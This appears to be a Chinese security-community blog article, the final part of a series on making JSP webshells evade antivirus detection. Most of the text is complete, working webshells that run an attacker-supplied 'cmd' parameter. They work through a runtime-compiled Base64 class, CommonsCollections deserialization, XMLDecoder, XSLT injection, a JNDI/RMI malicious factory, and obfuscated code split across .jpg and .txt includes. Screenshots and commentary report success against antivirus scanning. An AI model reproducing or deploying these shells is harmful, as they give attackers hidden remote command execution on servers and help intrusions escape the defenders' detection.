<%@ page import="java.net.URL" %><%@ page import="java.net.URLClassLoader" %><%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.FileWriter" %><%@ page import="java.util.Base64" %><%@ page import="java.io.IOException" %><%@ page import="javax.tools.JavaCompiler" %><%@ page import="javax.tools.ToolProvider" %><%@ page import="java.io.File" %><%  class delete{    public void deleteDir(File directory){      File files[] = directory.listFiles();      for (File file : files) {        if(file.isDirectory()){          deleteDir(file);        }else {          file.delete();        }      }      directory.delete();    }  }  String cmd = request.getParameter("cmd");  String base64Code = "cGFja2FnZSBjb20uZGVtbzsgIGltcG9ydCBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyOyBpbXBvcnQgamF2YS5pby5JT0V4Y2VwdGlvbjsgaW1wb3J0IGphdmEuaW8uSW5wdXRTdHJlYW07IGltcG9ydCBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyOyAgcHVibGljIGNsYXNzIFNoZWxsIHsgICAgIHB1YmxpYyBzdGF0aWMgU3RyaW5nIHJ1bnMoU3RyaW5nIGNtZCkgdGhyb3dzIElPRXhjZXB0aW9uIHsgICAgICAgICBQcm9jZXNzIHByb2Nlc3MgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGNtZCk7ICAgICAgICAgSW5wdXRTdHJlYW0gaXMgPSBwcm9jZXNzLmdldElucHV0U3RyZWFtKCk7ICAgICAgICAgQnVmZmVyZWRSZWFkZXIgYnVmZmVyZWRSZWFkZXIgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKGlzKSk7ICAgICAgICAgU3RyaW5nIHIgPSAiIjsgICAgICAgICBTdHJpbmcgcyA9ICIiOyAgICAgICAgIHdoaWxlKChyID0gYnVmZmVyZWRSZWFkZXIucmVhZExpbmUoKSkhPW51bGwpeyAgICAgICAgICAgICBzICs9IHI7ICAgICAgICAgfSAgICAgICAgIHJldHVybiBzOyAgICAgfSAgfQ==";  FileWriter writer;  try {    writer = new FileWriter(System.getProperty("user.dir")+"\\Shell.java");    writer.write(new String(Base64.getDecoder().decode(base64Code)));    writer.flush();    writer.close();  } catch (IOException e) {    e.printStackTrace();  }  try {    JavaCompiler javac = ToolProvider.getSystemJavaCompiler();    int status = javac.run(null, null, null, "-d", System.getProperty("user.dir"),System.getProperty("user.dir")+"\\Shell.java");    if(status!=0){      response.getWriter().println(System.getProperty("user.dir"));    }    URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(String.valueOf(System.getProperty("user.dir"))).toURI().toURL()});    Class shell = classLoader.loadClass("com.demo.Shell");    Object object = shell.newInstance();    Method dm = shell.getDeclaredMethod("runs",String.class);    Object invoke = dm.invoke(object, cmd);    response.getWriter().println(invoke);    new delete().deleteDir(new File(System.getProperty("user.dir") + "\\com"));    new delete().deleteDir(new File(System.getProperty("user.dir") + "\\Shell.java"));  } catch (Exception e) {    e.printStackTrace();  }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraiaPBfkTJ3mcJTZ29fblwvotk6felWqwZ485hibXKbENmRA1IkJ9QsWNg/640?wx_fmt=png)15.png

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraCVO2ImWCLiceoVHZ7H0C8vic16U2ibJ2ACL2D3dYiaQBQrnO6W8ibs7ZW4g/640?wx_fmt=png)16.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra4IEThp1LRyiaT19tDWNsSqafzmtdzOcA6rnXr1zaTo1bFJM64Ar92KA/640?wx_fmt=png)17.png

总结：
---

如果大家学过 shellcode 的免杀，我想都会有一种似曾相识的感觉，没错，这里的字节码类似与 shellcode，而类加载器类似于 shellcode 加载器。本文讲解了最常用的生成字节码的方式，以及利用类加载器加载字节码达到免杀效果。

自建漏洞免杀
======

本章主要讲解，如何利用通用漏洞来进行命令执行，从而达到免杀效果

常规反序列化免杀
--------

这种方式就相当于直接触发提供一个反序列化漏洞入口，但是能否被利用，还是在于服务端本身是否存在反序列化漏洞，下面给了一个例子，使用 cc1 链构建的 webshell。

```
<%@ page import="java.io.*" %><%@ page import="org.apache.commons.collections.Transformer" %><%@ page import="org.apache.commons.collections.functors.ConstantTransformer" %><%@ page import="org.apache.commons.collections.functors.InvokerTransformer" %><%@ page import="org.apache.commons.collections.functors.ChainedTransformer" %><%@ page import="java.util.Map" %><%@ page import="java.util.HashMap" %><%@ page import="org.apache.commons.collections.map.LazyMap" %><%@ page import="java.lang.reflect.Constructor" %><%@ page import="java.lang.reflect.InvocationHandler" %><%@ page import="java.lang.annotation.Retention" %><%@ page import="java.lang.reflect.Proxy" %><%    String cmd = request.getParameter("cmd");    Transformer[] transformers = new Transformer[] {            new ConstantTransformer(Runtime.class),            new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),            new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),            new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { cmd }) };    Transformer transformerChain = new ChainedTransformer(transformers);    Map innermap = new HashMap();    Map outmap = LazyMap.decorate(innermap, transformerChain);    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);    construct.setAccessible(true);    InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outmap);    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);    handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);    ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));    outputStream.writeObject(handler);    outputStream.close();    ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));    inputStream.readObject();%>
```

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraUAn3wMtgmctuUAjJUeyBR1wBazZGRy5ANxpAnrQ3ULLausiaiajZvic8Q/640?wx_fmt=png)1.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraDiahNOPUOovxeBeCMNsmGjyC5qRoqnlPZE7O6JETJvT5YpVejWkYLXg/640?wx_fmt=png)2.png

可见由于调用的函数太多，特征也非常明显，这里算是提供一些思路。

XMLDecoder 免杀
-------------

想必大家都分析 Weblogic 的 xmlDecoder 反序列化漏洞，XMLDecoder 免杀其实就是利用 XMLDecoder 处理恶意的 xml 文件导致命令执行，并没有太多常见命令函数的特征，免杀效果不错。

```
<%@ page import="java.beans.XMLDecoder" %><%@ page import="java.io.*" %><%    String cmd = request.getParameter("cmd");    String s = "<object class=\"java.lang.ProcessBuilder\">\n" +            "<array class=\"java.lang.String\" length=\"3\">\n" +            "<void index=\"0\">\n" +            "<string>cmd.exe</string>\n" +            "</void>\n" +            "<void index=\"1\">\n" +            "<string>/c</string>\n" +            "</void>\n" +            "<void index=\"2\">\n" +            "<string>"+cmd+"</string>\n" +            "</void>\n" +            "</array>\n" +            "<void method=\"start\" />\n" +            "</object>\n";    XMLDecoder xd = new XMLDecoder(new ByteArrayInputStream(s.getBytes()));    ProcessBuilder process = (ProcessBuilder) xd.readObject();    InputStream is = process.start().getInputStream();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));    String r = null;    while((r = bufferedReader.readLine())!=null){        response.getWriter().println(r);    }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraxOeuAnSicONrM3Wiaq6XlNdz9v8ibKhVgX9H560P2uMIeCcwHT3ju3zkg/640?wx_fmt=png)3.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraE3xialzvjDibWhKtfqVHgCexlWD31vriaia5h0vPibuI6cvN37ctAHmlYqw/640?wx_fmt=png)4.png

XSLT 免杀
-------

其实就是利用 XSLT 注入来执行命令，但值得注意的是 XSLT 注入笔者目前并没有想到合适的方法让内容回显，因为 XSLT 貌似只能执行静态方法且返回值都是以 String 类型返回，导致 process 中的数据很难取出来。

```
<%@ page import="java.io.*" %><%@ page import="javax.xml.transform.Transformer" %><%@ page import="javax.xml.transform.stream.StreamResult" %><%@ page import="javax.xml.transform.TransformerFactory" %><%@ page import="javax.xml.transform.stream.StreamSource" %><%    String cmd = request.getParameter("cmd");    String s = "  <xsl:stylesheet version=\"1.0\" " +            "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" " +            "xmlns:rt=\"java.lang.Runtime\"> " +            "    <xsl:template match=\"/\">\n" +            "      <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>\n" +            "      <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'"+cmd+"')\"/>\n" +            "      <xsl:variable name=\"ddd\" select=\"$process\"/>\n" +            "      <xsl:value-of select=\"$ddd\"/>\n" +            "    </xsl:template>\n" +            "  </xsl:stylesheet>";    InputStream in = new ByteArrayInputStream(s.getBytes());    StreamResult result = new StreamResult(new ByteArrayOutputStream());    Transformer t = TransformerFactory.newInstance().newTransformer(new StreamSource(in));    t.transform(new StreamSource(new ByteArrayInputStream("<?xml version=\"1.0\" encoding=\"UTF-8\"?><data></data>".getBytes())),result);%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra8U8GVoooqtg2TIgK85fvDReoOicqhLanias8jEzl81Yuf2gOicfiaZLP2A/640?wx_fmt=png)7.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra6ylv2vH2NQ0fASDUsVGc8KiasMhTzWgBAYkINnjdg48vwPRJbHXXcyg/640?wx_fmt=png)6.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraUAn3wMtgmctuUAjJUeyBR1wBazZGRy5ANxpAnrQ3ULLausiaiajZvic8Q/640?wx_fmt=png)5.png

JNDI 注入免杀
---------

攻击者：

```
package com.demo;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Demo2 {    public static void main(String[] args) throws Exception {        try {            Registry registry = LocateRegistry.createRegistry(1099);            Reference aa = new Reference("Calc", "Calc", "http://127.0.0.1/");            ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);            registry.bind("hello", refObjWrapper);        } catch (Exception e) {            e.printStackTrace();        }    \}\}
```

恶意类：

```
import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.util.Hashtable;public class Calc implements ObjectFactory {    public Calc() {        try {            Runtime.getRuntime().exec("calc");        } catch (Exception e) {        }    }    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {        System.out.println(nameCtx);        //Runtime.getRuntime().exec("calc");        return null;    \}\}
```

webshell：

```
<%@ page import="javax.naming.Context" %><%@ page import="javax.naming.InitialContext" %><%@ page language="java" pageEncoding="UTF-8" %><%    try {        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");        String uri = "rmi://127.0.0.1:1099/hello";        Context ctx = new InitialContext();        ctx.lookup(uri);    } catch (Exception e) {        e.printStackTrace();    }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrauLXOSGTWmGyH3Y00GOJwBYTBDXeaDFq743BSMGPLmgWgupIblB8JcQ/640?wx_fmt=png)8.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraAPI08VBrjxrejSO0icB3nKs39jrWuuhUicB9aqFOQmgmNHtV9iaQXiadbA/640?wx_fmt=png)9.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraUUqiaDqbPshavG2aLMLEQB1fZwibScDkFd040mhddCO9GFH3L7jejmQA/640?wx_fmt=png)10.png

总结：
---

本章主要是通过自己创造漏洞来执行命令，而我们用到的这些函数其实也是业务中比较常见的函数，且如果不了解漏洞原理，也不好分析是否是 webshell

其他免杀
====

本章只要将之前没讲的一些免杀反射进行补充

include 分离免杀
------------

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><%@ include file = "1.jpg" %>
```

1.jpg

```
<%    String cmd = request.getParameter("cmd");    Process process = Runtime.getRuntime().exec(cmd);    InputStream is = process.getInputStream();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));    String r = null;    while((r = bufferedReader.readLine())!=null){        response.getWriter().println(r);    }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra6Mwr3tWj7SvAGxv19icxKh0mKyaRKCTx6gLcvZlc9uxuH3KRC3hDUsQ/640?wx_fmt=png)1.png

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmradefdyqmQmxBjLbrMLX9AXSOkerUZf1Ync80180FR884MiblWMSoWl1Q/640?wx_fmt=png)2.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra5w8HFYSW9uFdTyicQvIs4cHNGvUIgc5Vtek3bia2nI42DHsac9Fn1dOw/640?wx_fmt=png)3.png

可以看到某盾会查杀 jpg 文件，这样的话，我们就在分解成多个部分

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraUdr1b8dnfoh9qtGAtxaLzicnYSxMmxIxjssS1sCEcxzicFuaPDMpOtrQ/640?wx_fmt=png)4.png

这里我们分成两部分进行包含

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmrah5hNbT3JhJN6iaa48hhtiaZYxUJiaJwUVpIV9kslYINmSWPIicDrCTQtIA/640?wx_fmt=png)5.png

发现依旧绕不过，其实原因就是杀软的匹配规则，有的是单一匹配，有的是同时匹配，因此我们换一个之前不免杀的 webshell（由于两处及以上特征存在导致被查杀）

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmrax81hg71sU1K59eVMELTIZmCoEpKico822s8GVkWpfibmlgMWdKIglGLw/640?wx_fmt=png)6.png

正常运行

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraQGbxVS1pxtFSiciaYg1HjhIibTtjxibMGCibTQUu71gdeib9IPeG1VGu2ESg/640?wx_fmt=png)7.png

某盾不在查杀

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%@ include file = "1.jpg" %><%@ include file = "2.txt" %>
```

1.jpg

```
<%           String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));        Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));        Method runtimeMethod = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));        Method method = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);        Object object = method.invoke(runtimeMethod.invoke(null),cmd);        Process process = (Process) object;%>
```

2.txt

```
<%    InputStream is = process.getInputStream();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));    String r = null;    while((r = bufferedReader.readLine())!=null){        response.getWriter().println(r);    }%>
```

总结：
---

java 的免杀只要就是在于如何利用字节码，jsp 特性，创建漏洞，少见的 API 等方式去绕过杀软的正则表达式，一般的杀软为了降低误报率，其实规则写的并不苛刻，还是比较好绕过了，多种免杀一起使用可以达到比较好的效果，其实学免杀，并不是盲目去测试，而且要了解更多的语言特性，就相当于游戏规则，当你足够了解游戏规则，再去测试杀软的规则，才能游刃有余。从才开始的 php 到现在的 jsp，免杀系列已经写了 10 来篇了，weshell 免杀就此先告一段落，后面如果有新的知识点也会继续补充，感谢大家，关注红队蓝军。

**推荐阅读：**

[ATT&CK 中的攻与防——T1059](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247493239&idx=1&sn=e72701aa2a8ba7987e4e511e34c05aee&chksm=c172f7e6f6057ef0cec381f0ceab0db4d77ce21fb75a61389631003d36f429f9773db41dd37b&scene=21#wechat_redirect)

[若依 (RuoYi) 管理系统后台 sql 注入漏洞分析](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247493177&idx=1&sn=d927ba04171466841222528403f6e2d3&chksm=c172f7a8f6057ebeeffb3e9439b0d9e7b8cb45a28f2d703c537037fc2895b0aecb193828e277&scene=21#wechat_redirect)

[利用 PHP-FPM 做内存马的方法](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247493061&idx=1&sn=b328e32f4b44bb9300776c409d1b86ef&chksm=c172f454f6057d42b963546cf83871d745973fda36c5a3989700290d2dffbe67b6631f8d43d5&scene=21#wechat_redirect)

**[一种新的 Tomcat 内存马 - Upgrade 内存马](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247493034&idx=1&sn=19da761e0945b563551d4187d174a194&chksm=c172f43bf6057d2d94affce2ed8e7c8c5f20ee5fbaa80f62ab0917851685e721eb74a5954fc6&scene=21#wechat_redirect)**

**[从偶遇 Flarum 开始的 RCE 之旅](http://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247492910&idx=1&sn=e6fa404efaa6a37dcf42a04336202546&chksm=c172f4bff6057da9c49c82ee6cbf5796f08d56acb6c304ae9ad8b5ae56af602e923fae4868cb&scene=21#wechat_redirect)**

跳跳糖是一个安全社区，旨在为安全人员提供一个能让思维跳跃起来的交流平台。

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以 500RMB-1000RMB 不等的奖励，具体文章要求可以查看 “投稿须知”。

阅读更多原创技术文章，戳 “阅读全文”